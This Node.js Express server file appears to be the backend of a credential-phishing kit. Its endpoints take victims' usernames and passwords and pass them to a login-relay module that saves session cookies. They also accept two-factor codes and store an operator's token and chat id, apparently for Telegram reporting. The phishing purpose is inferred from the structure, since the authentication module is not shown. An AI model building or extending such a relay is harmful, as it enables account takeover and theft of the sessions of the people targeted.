const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
const server = require('http').Server(app);
const { initialize, check,enterCode,saveCookies, close } = require('./modules/authModule');

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const clientPath = path.join(__dirname, 'client');
const adminPath = path.join(__dirname, 'admin');
const configPath = path.join(__dirname, 'config.json');

app.post('/check', async (req, res) => {
    const { username, password } = req.body;

    try {
        await initialize();
        const result = await check(username, password);
        if (result === 'SUCCESS'){
            await saveCookies(result);
            await close();
            res.send('SUCCESS');
        }
        else if (result === 'WRONG'){
            res.send('WRONG');
            await close();
        }
        else{
            res.send(result);
        }
    } catch (error) {
        await close();
    }
});
app.post('/code', async (req, res) => {
    const { code } = req.body;
    try {
        await enterCode(code);
        await close();
        res.send('SUCCESS');
    } catch (error) {
        await close();
        res.status(500).send(error);
    }
});
app.post('/update', (req, res) => {
    const configInfo = {
        host: req.body.host,
        port: req.body.port,
        username: req.body.username,
        password: req.body.password,
        token: req.body.token,
        chatid: req.body.chatid
    };
    fs.writeFileSync(configPath, JSON.stringify(configInfo, null, 2));
    res.send('Thành công');
});

server.listen(port, () => {
    console.log(`http://localhost:${port}`);
});